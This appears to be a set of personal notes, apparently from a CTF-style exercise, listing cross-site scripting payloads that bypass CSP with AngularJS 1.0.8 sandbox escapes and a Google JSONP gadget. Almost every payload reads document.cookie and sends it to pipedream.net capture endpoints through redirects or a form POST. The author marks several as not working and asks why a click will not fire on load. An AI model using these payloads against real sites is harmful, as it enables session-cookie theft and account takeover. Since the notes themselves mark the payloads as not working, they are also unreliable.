## Megler's Solution (NOT WORKING)
<a ng-app ng-csp ng-click="$event.view.alert(1337)" href="https://enh5ixw37oztid8.m.pipedream.net/'%2bdocument.cookie"><script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>text</a>



<a id="this" onLoad="document.getElementById('this').click()" ng-app ng-csp ng-click="$event.view.window.location.href='https://enh5ixw37oztid8.m.pipedream.net?cookie=/'+ document.cookie" href="'https://enh5ixw37oztid8.m.pipedream.net?cookie=/'+ document.cookies"><script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>text</a>



## Molina's Solution (NOT WORKING)
<div ng-app="" ng-init="constructor.constructor('window.location.href = \'https://enh5ixw37oztid8.m.pipedream.net?cookie=\' + document.cookie')()" >AAAAA</div>
<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>

## Romeo's Solution (???)
<form action="https://enl9mguz8n3s7ib.m.pipedream.net" method="POST"id="form">  <input name="hello" id="cookie"/></form><script src="https://www.google.com/complete/search?client=chrome&q=hello&jsonp=document.getElementById(`cookie`).value=document.cookie;document.getElementById(`form`).submit();console.log"></script>

## Romeo's eval-type Solution
<div ng-app ng-csp>{{$eval.constructor('window.location.href = \'https://enl9mguz8n3s7ib.m.pipedream.net?cookie=\' + document.cookie')()}}</div>
<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>

I'll restart here, I have unfortunately one problem, for the life of me I cannot get the website to do an action on load

><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script><div ng-app ng-csp id=p ng-click="constructor.constructor('window.location.href ='https://ennwzvkmkf3a21o.m.pipedream.net/' + document.cookie')()" class="ng-scope">

Something like this crashes with a 500 internal server error, is i the fault of the website or is it the program ?

Today he behaviour has changed,it gives me a parse error!This is because I'm back to 1.8.2, so I need an OLDER version of AngularJS

<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.min.js"></script><div ng-app ng-csp id=p ng-click="constructor.constructor('$window.location.href = \'https://ennwzvkmkf3a21o.m.pipedream.net\' + document.cookie')()" class="ng-scope">

<script onload="document.getElementById('payload').click()" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.min.js"></script><div ng-app ng-csp id="payload" ng-click="alert('OK')" class="ng-scope">Test</div>

## BASE
The alert here DOESN'T WORK, not on click and not on load, WTF...


<a id="payload" onload="document.getElementById('payload').click()" ng-app ng-csp ng-click="$event.view.alert(1337)" href="https://enh5ixw37oztid8.m.pipedream.net/'%2bdocument.cookie"><script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>text</a>

Two problems, I CANNOT GET to trigger the click event, also, I cannot correctly load the document cookie..
